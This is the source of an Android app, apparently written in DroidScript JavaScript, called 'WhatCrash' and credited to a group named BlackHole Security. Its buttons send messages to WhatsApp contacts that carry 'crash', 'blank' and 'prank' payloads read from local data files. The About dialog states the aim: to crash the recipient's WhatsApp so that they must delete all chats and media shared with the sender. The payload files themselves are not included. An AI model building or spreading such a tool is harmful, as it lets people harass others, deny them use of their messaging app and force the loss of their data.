//WhatCrash for Android (22 August 2018 (12:04))
//Author   : DedSecTL
//Github   : https://github.com/Gameye98
//Codename : Alone.
//Team     : BlackHole Security
//Homepages: https://github.com/BlackHoleSecurity/wtcsh
function OnStart() {
	app.EnableBackKey(false);
	app.SetOrientation( "Portrait" );
	
	lay = app.CreateLayout( "linear", "FillXY,VCenter" );
	lay.SetBackground( "Img/background.jpg" );
	
	blank = app.CreateButton( "Blank", 0.7, 0.12, "Custom" );
	blank.SetFontFile( "font.ttf" );
	blank.SetTextSize( "30" );
	blank.SetBackColor( "black" );
	blank.SetOnTouch( blank_OnTouch );
	lay.AddChild( blank );
	
	crash = app.CreateButton( "Crash", 0.7, 0.12, "Custom" );
	crash.SetFontFile( "font.ttf" );
	crash.SetTextSize( "30" );
	crash.SetBackColor( "black" );
	crash.SetOnTouch( crash_OnTouch );
	lay.AddChild( crash );
	
	laugh = app.CreateButton( "Laugh", 0.7, 0.12, "Custom" );
	laugh.SetFontFile( "font.ttf" );
	laugh.SetTextSize( "30" );
	laugh.SetBackColor( "black" );
	laugh.SetOnTouch( laugh_OnTouch );
	lay.AddChild( laugh );
	
	prank = app.CreateButton( "Prank", 0.7, 0.12, "Custom" );
	prank.SetFontFile( "font.ttf" );
	prank.SetTextSize( "30" );
	prank.SetBackColor( "black" );
	prank.SetOnTouch( prank_OnTouch );
	lay.AddChild( prank );
	
	about = app.CreateButton( "About", 0.7, 0.12, "Custom" );
	about.SetFontFile( "font.ttf" );
	about.SetTextSize( "30" );
	about.SetBackColor( "black" );
	about.SetOnTouch( about_OnTouch );
	lay.AddChild( about );
	
	app.AddLayout( lay );
}
function blank_OnTouch() {
	app.OpenUrl( "https://api.whatsapp.com/send?text="+app.ReadFile("data/blank") );
}
function crash_OnTouch() {
	app.OpenUrl( "https://api.whatsapp.com/send?text="+app.ReadFile("data/crash") );
}
function laugh_OnTouch() {
	app.OpenUrl( "https://api.whatsapp.com/send?text="+app.ReadFile("data/laugh") );
}
function prank_OnTouch() {
	app.OpenUrl( "https://api.whatsapp.com/send?text="+app.ReadFile("data/prank") );
}
function about_OnTouch() {
	app.Alert( "WhatCrash for Android\nIt help you frustrate message recipients. WhatCrash will crash the Whatsapp app when messages are opened and the only way to solve a problem is to delete all chats, including any media, that have been shared with the person who sent the message.\n\nCopyright (C) 2018 by DedSecTL\n\nCvar1984\nCiKu370\nMr.TenSwapper07\namsitlab\n[M]iZun0\nMr.RM\nF4KS3C\nZG000XT\n3RROR_TMX\nMr.K3N\nScarl37\nTroublemaker97\nZetSec\nL_Viole\nde@hdies\nX14N23N6\nMR.R45K1N\nlord.zephyrus\nArwi\nZ3R0\n4cliba788\nmr0x100\nMrx04\nViruz\nMr_007\nIsnanindra\nMr_r00tz\nMr.K3R3H\nD4RK-S1DE\nbl1nd_p0int\nBLrose20.10\nIdannovita\nBlackHole Security." );
}
function OnBack()
{
	dlg = app.CreateYesNoDialog("Do you want to exit WhatCrash?");
	dlg.SetOnTouch(dlg_OnTouch);
	dlg.Show();
}
function dlg_OnTouch(choice)
{
	if (choice == "Yes") {
		app.Exit();
	}
	else {
		dlg.Dismiss();
	}
}